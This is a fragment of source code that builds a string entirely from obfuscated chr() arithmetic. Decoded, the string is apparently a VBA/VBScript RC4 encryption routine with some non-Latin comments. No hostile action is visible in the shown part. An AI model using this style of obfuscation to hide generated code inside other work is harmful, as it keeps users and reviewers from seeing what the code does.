1114112))+chr(int((-9765+9797)% 1114112))+chr(int((4121-4073)% 1114112))+chr(int((-9924+9956)% 1114112))+chr(int((-4370+4454)% 1114112))+chr(int((437340//3940)% 1114112))+chr(int((5315-5283)% 1114112))+chr(int((304500//6090)% 1114112))+chr(int((-6807+6860)% 1114112))+chr(int((19186//362)% 1114112))+chr(int((-6044+6057)% 1114112))+chr(int((9876-9866)% 1114112))+chr(int((-2071+2103)% 1114112))+chr(int((8923-8891)% 1114112))+chr(int((4890-4858)% 1114112))+chr(int((7473-7441)% 1114112))+chr(int((5632-5600)% 1114112))+chr(int((8294-8262)% 1114112))+chr(int((-271+303)% 1114112))+chr(int((6410-6378)% 1114112))+chr(int((5536-5421)% 1114112))+chr(int((44720//1118)% 1114112))+chr(int((6272-6167)% 1114112))+chr(int((26568//648)% 1114112))+chr(int((233440//7295)% 1114112))+chr(int((-8944+9005)% 1114112))+chr(int((204192//6381)% 1114112))+chr(int((5731-5626)% 1114112))+chr(int((9617-9604)% 1114112))+chr(int((7388-7378)% 1114112))+chr(int((960//30)% 1114112))+chr(int((99008//3094)% 1114112))+chr(int((8422-8390)% 1114112))+chr(int((19136//598)% 1114112))+chr(int((-6328+6360)% 1114112))+chr(int((199712//6241)% 1114112))+chr(int((-2315+2347)% 1114112))+chr(int((-6898+6930)% 1114112))+chr(int((9875-9768)% 1114112))+chr(int((-4621+4661)% 1114112))+chr(int((-7725+7830)% 1114112))+chr(int((-3507+3548)% 1114112))+chr(int((4844-4812)% 1114112))+chr(int((570716//9356)% 1114112))+chr(int((-3814+3846)% 1114112))+chr(int((-1467+1532)% 1114112))+chr(int((138115//1201)% 1114112))+chr(int((-7634+7733)% 1114112))+chr(int((-7021+7061)% 1114112))+chr(int((942-865)% 1114112))+chr(int((924630//8806)% 1114112))+chr(int((8706-8606)% 1114112))+chr(int((-6756+6796)% 1114112))+chr(int((-5325+5440)% 1114112))+chr(int((2765-2649)% 1114112))+chr(int((-7079+7193)% 1114112))+chr(int((2100//28)% 1114112))+chr(int((8156-8055)% 1114112))+chr(int((-7792+7913)% 1114112))+chr(int((5324//121)% 1114112))+chr(int((6423-6391)% 1114112))+chr(int((5454-5414)% 1114112))+chr(int((-4828+4933)% 1114112))+chr(int((13504//422)% 1114112))+chr(int((244552//3176)% 1114112))+chr(int((-3016+3127)% 1114112))+chr(int((-4103+4203)% 1114112))+chr(int((2567-2535)% 1114112))+chr(int((435-328)% 1114112))+chr(int((787-711)% 1114112))+chr(int((1474-1373)% 1114112))+chr(int((803550//7305)% 1114112))+chr(int((-5410+5451)% 1114112))+chr(int((-6556+6588)% 1114112))+chr(int((-2204+2247)% 1114112))+chr(int((223424//6982)% 1114112))+chr(int((-8753+8802)% 1114112))+chr(int((135872//3088)% 1114112))+chr(int((-7757+7789)% 1114112))+chr(int((272-223)% 1114112))+chr(int((340177//8297)% 1114112))+chr(int((1487-1446)% 1114112))+chr(int((-9083+9115)% 1114112))+chr(int((7132-7093)% 1114112))+chr(int((4540-4508)% 1114112))+chr(int((-13541+6804)% 1114112))+chr(int((-7.75285E+07//2501)% 1114112))+chr(int((-32055+4060)% 1114112))+chr(int((-1318-5661)% 1114112))+chr(int((-5.265648E+07//3209)% 1114112))+chr(int((-31857+4377)% 1114112))+chr(int((585065//9001)% 1114112))+chr(int((-2558+2641)% 1114112))+chr(int((-8549+8616)% 1114112))+chr(int((6403-6330)% 1114112))+chr(int((6271-6198)% 1114112))+chr(int((-2.477346E+07//3988)% 1114112))+chr(int((-17020-9885)% 1114112))+chr(int((-2542488//104)% 1114112))+chr(int((-1327+1340)% 1114112))+chr(int((-887+897)% 1114112))+chr(int((-7751+7783)% 1114112))+chr(int((2629-2597)% 1114112))+chr(int((-6489+6521)% 1114112))+chr(int((2254-2222)% 1114112))+chr(int((154518//1981)% 1114112))+chr(int((-764+865)% 1114112))+chr(int((629040//5242)% 1114112))+chr(int((1098636//9471)% 1114112))+chr(int((78793//6061)% 1114112))+chr(int((-7110+7120)% 1114112))+chr(int((-7378+7410)% 1114112))+chr(int((-1777+1809)% 1114112))+chr(int((2538-2506)% 1114112))+chr(int((119392//3731)% 1114112))+chr(int((-4327+4340)% 1114112))+chr(int((10580//1058)% 1114112))+chr(int((-7677+7709)% 1114112))+chr(int((8254-8222)% 1114112))+chr(int((3782-3750)% 1114112))+chr(int((214240//6695)% 1114112))+chr(int((7006-6967)% 1114112))+chr(int((8305-8273)% 1114112))+chr(int((4841-4766)% 1114112))+chr(int((937-854)% 1114112))+chr(int((616460//9484)% 1114112))+chr(int((-16-6721)% 1114112))+chr(int((-28078-2921)% 1114112))+chr(int((-24670-3325)% 1114112))+chr(int((-9340+3372)% 1114112))+chr(int((-25211-6560)% 1114112))+chr(int((-22908+5154)% 1114112))+chr(int((6567-6554)% 1114112))+chr(int((-635+645)% 1114112))+chr(int((-5907+5939)% 1114112))+chr(int((4841-4809)% 1114112))+chr(int((20576//643)% 1114112))+chr(int((-2196+2228)% 1114112))+chr(int((3270-3164)% 1114112))+chr(int((212384//6637)% 1114112))+chr(int((509533//8353)% 1114112))+chr(int((94368//2949)% 1114112))+chr(int((-1648+1696)% 1114112))+chr(int((23335//1795)% 1114112))+chr(int((-86+96)% 1114112))+chr(int((209408//6544)% 1114112))+chr(int((5186-5154)% 1114112))+chr(int((91072//2846)% 1114112))+chr(int((8978-8946)% 1114112))+chr(int((45850//655)% 1114112))+chr(int((256632//2312)% 1114112))+chr(int((-8647+8761)% 1114112))+chr(int((5661-5629)% 1114112))+chr(int((191940//1828)% 1114112))+chr(int((2132-2100)% 1114112))+chr(int((-9855+9916)% 1114112))+chr(int((3562-3530)% 1114112))+chr(int((24864//518)% 1114112))+chr(int((275424//8607)% 1114112))+chr(int((3176-3092)% 1114112))+chr(int((3798-3687)% 1114112))+chr(int((-6055+6087)% 1114112))+chr(int((-6024+6074)% 1114112))+chr(int((-6425+6478)% 1114112))+chr(int((-9745+9798)% 1114112))+chr(int((23387//1799)% 1114112))+chr(int((-3891+3901)% 1114112))+chr(int((-4637+4669)% 1114112))+chr(int((-3183+3215)% 1114112))+chr(int((9860-9828)% 1114112))+chr(int((1677-1645)% 1114112))+chr(int((3698-3666)% 1114112))+chr(int((-7915+7947)% 1114112))+chr(int((200128//6254)% 1114112))+chr(int((-3984+4016)% 1114112))+chr(int((5982-5876)% 1114112))+chr(int((-5627+5659)% 1114112))+chr(int((6122-6061)% 1114112))+chr(int((-5851+5883)% 1114112))+chr(int((204520//5113)% 1114112))+chr(int((-566+672)% 1114112))+chr(int((260512//8141)% 1114112))+chr(int((7314-7271)% 1114112))+chr(int((-1563+1595)% 1114112))+chr(int((5079-4964)% 1114112))+chr(int((11680//292)% 1114112))+chr(int((8464-8359)% 1114112))+chr(int((6991-6950)% 1114112))+chr(int((-3136+3168)% 1114112))+chr(int((4262-4219)% 1114112))+chr(int((4518-4486)% 1114112))+chr(int((9317-9210)% 1114112))+chr(int((7615-7575)% 1114112))+chr(int((55650//530)% 1114112))+chr(int((1185-1144)% 1114112))+chr(int((7853-7812)% 1114112))+chr(int((-3099+3131)% 1114112))+chr(int((288288//3744)% 1114112))+chr(int((-8871+8982)% 1114112))+chr(int((-8502+8602)% 1114112))+chr(int((2470-2438)% 1114112))+chr(int((364100//7282)% 1114112))+chr(int((-8754+8807)% 1114112))+chr(int((476874//8831)% 1114112))+chr(int((768-755)% 1114112))+chr(int((8485-8475)% 1114112))+chr(int((-6548+6580)% 1114112))+chr(int((68960//2155)% 1114112))+chr(int((31904//997)% 1114112))+chr(int((113792//3556)% 1114112))+chr(int((-8387+8419)% 1114112))+chr(int((116448//3639)% 1114112))+chr(int((279552//8736)% 1114112))+chr(int((-2637+2669)% 1114112))+chr(int((-5483+5599)% 1114112))+chr(int((4853-4752)% 1114112))+chr(int((-7090+7199)% 1114112))+chr(int((544320//4860)% 1114112))+chr(int((305600//9550)% 1114112))+chr(int((510570//8370)% 1114112))+chr(int((72640//2270)% 1114112))+chr(int((3200-3085)% 1114112))+chr(int((-6820+6860)% 1114112))+chr(int((396375//3775)% 1114112))+chr(int((-7447+7488)% 1114112))+chr(int((-9189+9202)% 1114112))+chr(int((-4261+4271)% 1114112))+chr(int((1688-1656)% 1114112))+chr(int((9083-9051)% 1114112))+chr(int((9012-8980)% 1114112))+chr(int((-3650+3682)% 1114112))+chr(int((291424//9107)% 1114112))+chr(int((842-810)% 1114112))+chr(int((-7058+7090)% 1114112))+chr(int((-7119+7151)% 1114112))+chr(int((-4515+4630)% 1114112))+chr(int((9315-9275)% 1114112))+chr(int((2216-2111)% 1114112))+chr(int((-1847+1888)% 1114112))+chr(int((100192//3131)% 1114112))+chr(int((8671-8610)% 1114112))+chr(int((-1498+1530)% 1114112))+chr(int((5376-5261)% 1114112))+chr(int((965-925)% 1114112))+chr(int((597628//5638)% 1114112))+chr(int((-6697+6738)% 1114112))+chr(int((9809-9796)% 1114112))+chr(int((740-730)% 1114112))+chr(int((4866-4834)% 1114112))+chr(int((8064-8032)% 1114112))+chr(int((8204-8172)% 1114112))+chr(int((6706-6674)% 1114112))+chr(int((-3302+3334)% 1114112))+chr(int((-9585+9617)% 1114112))+chr(int((8259-8227)% 1114112))+chr(int((9319-9287)% 1114112))+chr(int((6042-5927)% 1114112))+chr(int((-4563+4603)% 1114112))+chr(int((843124//7954)% 1114112))+chr(int((-468+509)% 1114112))+chr(int((91-59)% 1114112))+chr(int((55+6)% 1114112))+chr(int((-470+502)% 1114112))+chr(int((8800-8684)% 1114112))+chr(int((-732+833)% 1114112))+chr(int((1859-1750)% 1114112))+chr(int((-9065+9177)% 1114112))+chr(int((-3551+3564)% 1114112))+chr(int((-5998+6008)% 1114112))+chr(int((309248//9664)% 1114112))+chr(int((78080//2440)% 1114112))+chr(int((1337-1305)% 1114112))+chr(int((1031-999)% 1114112))+chr(int((-2405+2483)% 1114112))+chr(int((900011//8911)% 1114112))+chr(int((9591-9471)% 1114112))+chr(int((3993-3877)% 1114112))+chr(int((37024//2848)% 1114112))+chr(int((2372-2362)% 1114112))+chr(int((-1999+2031)% 1114112))+chr(int((402-370)% 1114112))+chr(int((2339-2307)% 1114112))+chr(int((215232//6726)% 1114112))+chr(int((56706//4362)% 1114112))+chr(int((88610//8861)% 1114112))+chr(int((6347-6315)% 1114112))+chr(int((-1057+1089)% 1114112))+chr(int((-8215+8247)% 1114112))+chr(int((-5359+5391)% 1114112))+chr(int((360048//9232)% 1114112))+chr(int((150208//4694)% 1114112))+chr(int((549760//6872)% 1114112))+chr(int((709710//8655)% 1114112))+chr(int((-9253+9324)% 1114112))+chr(int((-1875+1940)% 1114112))+chr(int((3060-9834)% 1114112))+chr(int((-1.219054E+08//5007)% 1114112))+chr(int((-16837-3765)% 1114112))+chr(int((-13859+7384)% 1114112))+chr(int((-40413+8132)% 1114112))+chr(int((-7.735399E+07//3455)% 1114112))+chr(int((-3620+3633)% 1114112))+chr(int((7370//737)% 1114112))+chr(int((9207-9175)% 1114112))+chr(int((21216//663)% 1114112))+chr(int((-8881+8913)% 1114112))+chr(int((59712//1866)% 1114112))+chr(int((1881-1776)% 1114112))+chr(int((5987-5955)% 1114112))+chr(int((213378//3498)% 1114112))+chr(int((185536//5798)% 1114112))+chr(int((-1106+1154)% 1114112))+chr(int((-6274+6306)% 1114112))+chr(int((244-186)% 1114112))+chr(int((-7680+7712)% 1114112))+chr(int((417216//3936)% 1114112))+chr(int((1383-1351)% 1114112))+chr(int((346419//5679)% 1114112))+chr(int((-7913+7945)% 1114112))+chr(int((3201-3153)% 1114112))+chr(int((268160//8380)% 1114112))+chr(int((-5532+5590)% 1114112))+chr(int((-6959+6991)% 1114112))+chr(int((3356-3245)% 1114112))+chr(int((-7222+7339)% 1114112))+chr(int((9549-9433)% 1114112))+chr(int((-426+498)% 1114112))+chr(int((510555//5055)% 1114112))+chr(int((699720//5831)% 1114112))+chr(int((-5601+5633)% 1114112))+chr(int((260653//4273)% 1114112))+chr(int((26752//836)% 1114112))+chr(int((4148-4114)% 1114112))+chr(int((-6483+6517)% 1114112))+chr(int((120601//9277)% 1114112))+chr(int((92430//9243)% 1114112))+chr(int((3296//103)% 1114112))+chr(int((3355-3323)% 1114112))+chr(int((6661-6629)% 1114112))+chr(int((-309+341)% 1114112))+chr(int((-4300+4370)% 1114112))+chr(int((132090//1190)% 1114112))+chr(int((296742//2603)% 1114112))+chr(int((-568+600)% 1114112))+chr(int((576016//5143)% 1114112))+chr(int((4279-4168)% 1114112))+chr(int((-3514+3629)% 1114112))+chr(int((-7862+7894)% 1114112))+chr(int((201544//3304)% 1114112))+chr(int((6720//210)% 1114112))+chr(int((-1246+1295)% 1114112))+chr(int((6539-6507)% 1114112))+chr(int((7479-7395)% 1114112))+chr(int((685536//6176)% 1114112))+chr(int((-7312+7344)% 1114112))+chr(int((-2052+2128)% 1114112))+chr(int((-8510+8611)% 1114112))+chr(int((311630//2833)% 1114112))+chr(int((8715-8675)% 1114112))+chr(int((-6734+6849)% 1114112))+chr(int((-5728+5805)% 1114112))+chr(int((9955-9854)% 1114112))+chr(int((269445//2343)% 1114112))+chr(int((-4059+4174)% 1114112))+chr(int((47142//486)% 1114112))+chr(int((921-818)% 1114112))+chr(int((663-562)% 1114112))+chr(int((164328//4008)% 1114112))+chr(int((23634//1818)% 1114112))+chr(int((82110//8211)% 1114112))+chr(int((5730-5698)% 1114112))+chr(int((245312//7666)% 1114112))+chr(int((1656-1624)% 1114112))+chr(int((269536//8423)% 1114112))+chr(int((168864//5277)% 1114112))+chr(int((-2835+2867)% 1114112))+chr(int((-9348+9380)% 1114112))+chr(int((216128//6754)% 1114112))+chr(int((-6873+6978)% 1114112))+chr(int((8769-8737)% 1114112))+chr(int((-7159+7220)% 1114112))+chr(int((-2374+2406)% 1114112))+chr(int((145560//3639)% 1114112))+chr(int((84945//809)% 1114112))+chr(int((4967-4935)% 1114112))+chr(int((3533-3490)% 1114112))+chr(int((-8222+8254)% 1114112))+chr(int((-5971+6020)% 1114112))+chr(int((203811//4971)% 1114112))+chr(int((64768//2024)% 1114112))+chr(int((-8894+8971)% 1114112))+chr(int((-7605+7716)% 1114112))+chr(int((7530-7430)% 1114112))+chr(int((8961-8929)% 1114112))+chr(int((204800//4096)% 1114112))+chr(int((34291//647)% 1114112))+chr(int((5124-5070)% 1114112))+chr(int((117455//9035)% 1114112))+chr(int((70910//7091)% 1114112))+chr(int((191072//5971)% 1114112))+chr(int((-8276+8308)% 1114112))+chr(int((194464//6077)% 1114112))+chr(int((1606-1574)% 1114112))+chr(int((200032//6251)% 1114112))+chr(int((-183+215)% 1114112))+chr(int((7729-7697)% 1114112))+chr(int((-6288+6320)% 1114112))+chr(int((563-457)% 1114112))+chr(int((48544//1517)% 1114112))+chr(int((504-443)% 1114112))+chr(int((-227+259)% 1114112))+chr(int((358600//8965)% 1114112))+chr(int((5705-5599)% 1114112))+chr(int((-4736+4768)% 1114112))+chr(int((321554//7478)% 1114112))+chr(int((-8525+8557)% 1114112))+chr(int((402615//3501)% 1114112))+chr(int((1320//33)% 1114112))+chr(int((233100//2220)% 1114112))+chr(int((7463-7422)% 1114112))+chr(int((8959-8918)% 1114112))+chr(int((9538-9506)% 1114112))+chr(int((-3809+3886)% 1114112))+chr(int((17094//154)% 1114112))+chr(int((3305-3205)% 1114112))+chr(int((5389-5357)% 1114112))+chr(int((101450//2029)% 1114112))+chr(int((-2702+2755)% 1114112))+chr(int((422-368)% 1114112))+chr(int((3681-3668)% 1114112))+chr(int((1374-1364)% 1114112))+chr(int((244192//7631)% 1114112))+chr(int((2106-2074)% 1114112))+chr(int((301504//9422)% 1114112))+chr(int((6788-6756)% 1114112))+chr(int((275072//8596)% 1114112))+chr(int((-2612+2644)% 1114112))+chr(int((1544-1512)% 1114112))+chr(int((263424//8232)% 1114112))+chr(int((5985-5869)% 1114112))+chr(int((409555//4055)% 1114112))+chr(int((7844-7735)% 1114112))+chr(int((668752//5971)% 1114112))+chr(int((1110-1078)% 1114112))+chr(int((-880+941)% 1114112))+chr(int((9828-9796)% 1114112))+chr(int((610650//5310)% 1114112))+chr(int((-2213+2253)% 1114112))+chr(int((5697-5592)% 1114112))+chr(int((340505//8305)% 1114112))+chr(int((1757-1744)% 1114112))+chr(int((88340//8834)% 1114112))+chr(int((2986-2954)% 1114112))+chr(int((-7747+7779)% 1114112))+chr(int((5952-5920)% 1114112))+chr(int((6697-6665)% 1114112))+chr(int((180160//5630)% 1114112))+chr(int((1671-1639)% 1114112))+chr(int((-8613+8645)% 1114112))+chr(int((95904//2997)% 1114112))+chr(int((8994-8879)% 1114112))+chr(int((7256-7216)% 1114112))+chr(int((-5776+5881)% 1114112))+chr(int((1529-1488)% 1114112))+chr(int((179680//5615)% 1114112))+chr(int((-684+745)% 1114112))+chr(int((119840//3745)% 1114112))+chr(int((828000//7200)% 1114112))+chr(int((-1371+1411)% 1114112))+chr(int((2474-2368)% 1114112))+chr(int((144033//3513)% 1114112))+chr(int((1617-1604)% 1114112))+chr(int((9503-9493)% 1114112))+chr(int((-1100+1132)% 1114112))+chr(int((211680//6615)% 1114112))+chr(int((7607-7575)% 1114112))+chr(int((5777-5745)% 1114112))+chr(int((319712//9991)% 1114112))+chr(int((-9605+9637)% 1114112))+chr(int((140672//4396)% 1114112))+chr(int((3740-3708)% 1114112))+chr(int((92575//805)% 1114112))+chr(int((9363-9323)% 1114112))+chr(int((292136//2756)% 1114112))+chr(int((-9536+9577)% 1114112))+chr(int((-9310+9342)% 1114112))+chr(int((7634-7573)% 1114112))+chr(int((-9716+9748)% 1114112))+chr(int((-7090+7206)% 1114112))+chr(int((376-275)% 1114112))+chr(int((-6333+6442)% 1114112))+chr(int((3986-3874)% 1114112))+chr(int((3115-3102)% 1114112))+chr(int((-2171+2181)% 1114112))+chr(int((100544//3142)% 1114112))+chr(int((74-42)% 1114112))+chr(int((-1400+1432)% 1114112))+chr(int((81504//2547)% 1114112))+chr(int((5073-5041)% 1114112))+chr(int((4596-4564)% 1114112))+chr(int((9048-9016)% 1114112))+chr(int((-2733+2765)% 1114112))+chr(int((-4650+4663)% 1114112))+chr(int((-151+161)% 1114112))+chr(int((10592//331)% 1114112))+chr(int((3163-3131)% 1114112))+chr(int((4722-4690)% 1114112))+chr(int((30624//957)% 1114112))+chr(int((2545-2513)% 1114112))+chr(int((251232//7851)% 1114112))+chr(int((-2926+2958)% 1114112))+chr(int((239584//7487)% 1114112))+chr(int((389-350)% 1114112))+chr(int((-2+34)% 1114112))+chr(int((-5.053404E+07//7460)% 1114112))+chr(int((-26034+1687)% 1114112))+chr(int((-19313-1289)% 1114112))+chr(int((-30-6697)% 1114112))+chr(int((-17366-1346)% 1114112))+chr(int((-15077-1903)% 1114112))+chr(int((-6552-432)% 1114112))+chr(int((-13927-3764)% 1114112))+chr(int((-37232+7921)% 1114112))+chr(int((1107-7886)% 1114112))+chr(int((-15477-5539)% 1114112))+chr(int((-1.750707E+07//1062)% 1114112))+chr(int((-3.826407E+07//5647)% 1114112))+chr(int((364959//5793)% 1114112))+chr(int((2034-2024)% 1114112))+chr(int((-7296+7328)% 1114112))+chr(int((-3111+3143)% 1114112))+chr(int((-3156+3188)% 1114112))+chr(int((7990-7958)% 1114112))+chr(int((166496//5203)% 1114112))+chr(int((-4151+4183)% 1114112))+chr(int((4071-4039)% 1114112))+chr(int((9102-9070)% 1114112))+chr(int((-6166+6234)% 1114112))+chr(int((283185//2697)% 1114112))+chr(int((3833-3724)% 1114112))+chr(int((119776//3743)% 1114112))+chr(int((658224//5877)% 1114112))+chr(int((7881-7773)% 1114112))+chr(int((390328//4024)% 1114112))+chr(int((8122-8017)% 1114112))+chr(int((934010//8491)% 1114112))+chr(int((579751//8653)% 1114112))+chr(int((-8024+8128)% 1114112))+chr(int((57036//588)% 1114112))+chr(int((2457-2343)% 1114112))+chr(int((9781-9737)% 1114112))+chr(int((-5599+5631)% 1114112))+chr(int((-7710+7809)% 1114112))+chr(int((-4501+4606)% 1114112))+chr(int((625072//5581)% 1114112))+chr(int((783432//7533)% 1114112))+chr(int((877488//8688)% 1114112))+chr(int((6473-6359)% 1114112))+chr(int((5963-5897)% 1114112))+chr(int((150282//1242)% 1114112))+chr(int((-9775+9891)% 1114112))+chr(int((-7486+7587)% 1114112))+chr(int((565-552)% 1114112))+chr(int((5581-5571)% 1114112))+chr(int((771-739)% 1114112))+chr(int((69824//2182)% 1114112))+chr(int((4603-4571)% 1114112))+chr(int((-5709+5741)% 1114112))+chr(int((8242-8210)% 1114112))+chr(int((94112//2941)% 1114112))+chr(int((100352//3136)% 1114112))+chr(int((-8344+8376)% 1114112))+chr(int((-1824+1936)% 1114112))+chr(int((6678-6570)% 1114112))+chr(int((638454//6582)% 1114112))+chr(int((6614-6509)% 1114112))+chr(int((1012990//9209)% 1114112))+chr(int((8744-8677)% 1114112))+chr(int((561912//5403)% 1114112))+chr(int((444163//4579)% 1114112))+chr(int((10089-9975)% 1114112))+chr(int((280960//8780)% 1114112))+chr(int((320128//5248)% 1114112))+chr(int((-3399+3431)% 1114112))+chr(int((-1771+1836)% 1114112))+chr(int((5417-5302)% 1114112))+chr(int((-1824+1923)% 1114112))+chr(int((212600//5315)% 1114112))+chr(int((-4973+5050)% 1114112))+chr(int((60060//572)% 1114112))+chr(int((639000//6390)% 1114112))+chr(int((355520//8888)% 1114112))+chr(int((866410//7534)% 1114112))+chr(int((5901-5824)% 1114112))+chr(int((9869-9768)% 1114112))+chr(int((-4100+4215)% 1114112))+chr(int((9973-9858)% 1114112))+chr(int((601594//6202)% 1114112))+chr(int((857887//8329)% 1114112))+chr(int((-7663+7764)% 1114112))+chr(int((-205+249)% 1114112))+chr(int((-5719+5751)% 1114112))+chr(int((8618-8506)% 1114112))+chr(int((822732//7412)% 1114112))+chr(int((9707-9592)% 1114112))+chr(int((106832//2428)% 1114112))+chr(int((1917-1885)% 1114112))+chr(int((7491-7442)% 1114112))+chr(int((263507//6427)% 1114112))+chr(int((-3050+3091)% 1114112))+chr(int((6688//209)% 1114112))+chr(int((3579-3540)% 1114112))+chr(int((62400//1950)% 1114112))+chr(int((-5.533603E+07//8508)% 1114112))+chr(int((-1.094461E+07//378)% 1114112))+chr(int((-19198-7803)% 1114112))+chr(int((-1503-5013)% 1114112))+chr(int((-22047-8352)% 1114112))+chr(int((-9364+9447)% 1114112))+chr(int((-3664+3731)% 1114112))+chr(int((7198-7125)% 1114112))+chr(int((6274-6201)% 1114112))+chr(int((-16376+9628)% 1114112))+chr(int((-3.882402E+07//1232)% 1114112))+chr(int((-35990+7452)% 1114112))+chr(int((59020//4540)% 1114112))+chr(int((32900//3290)% 1114112))+chr(int((51776//1618)% 1114112))+chr(int((-7782+7814)% 1114112))+chr(int((9795-9763)% 1114112))+chr(int((254592//7956)% 1114112))+chr(int((83520//2610)% 1114112))+chr(int((7721-7689)% 1114112))+chr(int((-7133+7165)% 1114112))+chr(int((1340-1308)% 1114112))+chr(int((330066//3334)% 1114112))+chr(int((-9106+9211)% 1114112))+chr(int((6064-5952)% 1114112))+chr(int((6286-6182)% 1114112))+chr(int((-9220+9321)% 1114112))+chr(int((-2056+2170)% 1114112))+chr(int((279444//4234)% 1114112))+chr(int((5693-5572)% 1114112))+chr(int((7627-7511)% 1114112))+chr(int((9114-9013)% 1114112))+chr(int((128864//4027)% 1114112))+chr(int((465247//7627)% 1114112))+chr(int((-1215+1247)% 1114112))+chr(int((9956-9841)% 1114112))+chr(int((-6215+6255)% 1114112))+chr(int((26080//652)% 1114112))+chr(int((-5167+5282)% 1114112))+chr(int((296520//7413)% 1114112))+chr(int((-5640+5745)% 1114112))+chr(int((-8069+8110)% 1114112))+chr(int((-740+772)% 1114112))+chr(int((92235//2145)% 1114112))+chr(int((6267-6235)% 1114112))+chr(int((-3504+3619)% 1114112))+chr(int((11240//281)% 1114112))+chr(int((753448//7108)% 1114112))+chr(int((-5324+5365)% 1114112))+chr(int((-5911+5952)% 1114112))+chr(int((-2746+2778)% 1114112))+chr(int((-2953+3030)% 1114112))+chr(int((1074702//9682)% 1114112))+chr(int((-3942+4042)% 1114112))+chr(int((8672-8640)% 1114112))+chr(int((3343-3293)% 1114112))+chr(int((-9590+9643)% 1114112))+chr(int((-1920+1974)% 1114112))+chr(int((190568//4648)% 1114112))+chr(int((-8907+8939)% 1114112))+chr(int((4693-4605)% 1114112))+chr(int((4103-3992)% 1114112))+chr(int((1024974//8991)% 1114112))+chr(int((117216//3663)% 1114112))+chr(int((-7725+7837)% 1114112))+chr(int((1025460//9495)% 1114112))+chr(int((6361-6264)% 1114112))+chr(int((925995//8819)% 1114112))+chr(int((166210//1511)% 1114112))+chr(int((8106-8039)% 1114112))+chr(int((256672//2468)% 1114112))+chr(int((8511-8414)% 1114112))+chr(int((-1592+1706)% 1114112))+chr(int((4349-4336)% 1114112))+chr(int((20-10)% 1114112))+chr(int((131648//4114)% 1114112))+chr(int((3440-3408)% 1114112))+chr(int((3286-3254)% 1114112))+chr(int((86528//2704)% 1114112))+chr(int((-209+241)% 1114112))+chr(int((176256//5508)% 1114112))+chr(int((-4786+4818)% 1114112))+chr(int((24576//768)% 1114112))+chr(int((973581//8771)% 1114112))+chr(int((-5686+5803)% 1114112))+chr(int((1068012//9207)% 1114112))+chr(int((419760//5830)% 1114112))+chr(int((438138//4338)% 1114112))+chr(int((6119-5999)% 1114112))+chr(int((56320//1760)% 1114112))+chr(int((-5861+5922)% 1114112))+chr(int((-9201+9233)% 1114112))+chr(int((6816-6705)% 1114112))+chr(int((8085-7968)% 1114112))+chr(int((-365+481)% 1114112))+chr(int((604944//8402)% 1114112))+chr(int((246238//2438)% 1114112))+chr(int((-8362+8482)% 1114112))+chr(int((171296//5353)% 1114112))+chr(int((-4409+4447)% 1114112))+chr(int((6653-6621)% 1114112))+chr(int((336856//4108)% 1114112))+chr(int((-7684+7789)% 1114112))+chr(int((2731-2628)% 1114112))+chr(int((6687-6583)% 1114112))+chr(int((93496//806)% 1114112))+chr(int((1485-1445)% 1114112))+chr(int((5893-5859)% 1114112))+chr(int((410832//8559)% 1114112))+chr(int((-4662+4696)% 1114112))+chr(int((44352//1386)% 1114112))+chr(int((-9673+9711)% 1114112))+chr(int((86144//2692)% 1114112))+chr(int((507744//7052)% 1114112))+chr(int((9182-9081)% 1114112))+chr(int((7532-7412)% 1114112))+chr(int((8068-8028)% 1114112))+chr(int((921096//9304)% 1114112))+chr(int((7511-7406)% 1114112))+chr(int((542752//4846)% 1114112))+chr(int((7625-7521)% 1114112))+chr(int((811939//8039)% 1114112))+chr(int((-5529+5643)% 1114112))+chr(int((366498//5553)% 1114112))+chr(int((366993//3033)% 1114112))+chr(int((116//1)% 1114112))+chr(int((-4380+4481)% 1114112))+chr(int((234889//5729)% 1114112))+chr(int((374-330)% 1114112))+chr(int((7121-7089)% 1114112))+chr(int((-964+1014)% 1114112))+chr(int((-9185+9226)% 1114112))+chr(int((53105//4085)% 1114112))+chr(int((1368-1358)% 1114112))+chr(int((3776-3744)% 1114112))+chr(int((81760//2555)% 1114112))+chr(int((2908-2876)% 1114112))+chr(int((672//21)% 1114112))+chr(int((591084//7578)% 1114112))+chr(int((-9777+9878)% 1114112))+chr(int((4310-4190)% 1114112))+chr(int((-329+445)% 1114112))+chr(int((8841-8828)% 1114112))+chr(int((80190//8019)% 1114112))+chr(int((9449-9417)% 1114112))+chr(int((5188-5156)% 1114112))+chr(int((6912//216)% 1114112))+chr(int((46496//1453)% 1114112))+chr(int((8868-8855)% 1114112))+chr(int((-6823+6833)% 1114112))+chr(int((-5834+5866)% 1114112))+chr(int((7348-7316)% 1114112))+chr(int((214720//6710)% 1114112))+chr(int((-3281+3313)% 1114112))+chr(int((-6230+6312)% 1114112))+chr(int((-281+398)% 1114112))+chr(int((-5980+6090)% 1114112))+chr(int((2673-2591)% 1114112))+chr(int((233897//3491)% 1114112))+chr(int((-8111+8143)% 1114112))+chr(int((-3952+4013)% 1114112))+chr(int((7846-7814)% 1114112))+chr(int((5859-5748)% 1114112))+chr(int((661752//5656)% 1114112))+chr(int((742632//6402)% 1114112))+chr(int((2362-2290)% 1114112))+chr(int((286234//2834)% 1114112))+chr(int((814-694)% 1114112))+chr(int((40105//3085)% 1114112))+chr(int((4489-4479)% 1114112))+chr(int((-838+907)% 1114112))+chr(int((-8563+8673)% 1114112))+chr(int((-2698+2798)% 1114112))+chr(int((-2969+3001)% 1114112))+chr(int((7600-7530)% 1114112))+chr(int((896805//7665)% 1114112))+chr(int((-8073+8183)% 1114112))+chr(int((1727-1628)% 1114112))+chr(int((-6557+6673)% 1114112))+chr(int((3501-3396)% 1114112))+chr(int((87357//787)% 1114112))+chr(int((4403-4293)% 1114112))+chr(int((3724-3711)% 1114112))+chr(int((4260-4250)% 1114112))+chr(int((-6051+6064)% 1114112))+chr(int((-71+81)% 1114112))+chr(int((466-427)% 1114112))+chr(int((6300-6268)% 1114112))+chr(int((-15360+8376)% 1114112))+chr(int((-1.435792E+08//8237)% 1114112))+chr(int((-21866-10)% 1114112))+chr(int((-4.86175E+07//8145)% 1114112))+chr(int((-1.932544E+08//5987)% 1114112))+chr(int((3287-3159)% 1114112))+chr(int((-19485+2053)% 1114112))+chr(int((-10516-6235)% 1114112))+chr(int((78936//6072)% 1114112))+chr(int((-9394+9404)% 1114112))+chr(int((551807//7559)% 1114112))+chr(int((973692//9546)% 1114112))+chr(int((310720//9710)% 1114112))+chr(int((507832//6682)% 1114112))+chr(int((4001-3934)% 1114112))+chr(int((-4647+4744)% 1114112))+chr(int((-6770+6885)% 1114112))+chr(int((491163//4863)% 1114112))+chr(int((10032-9992)% 1114112))+chr(int((-1066+1148)% 1114112))+chr(int((174330//1490)% 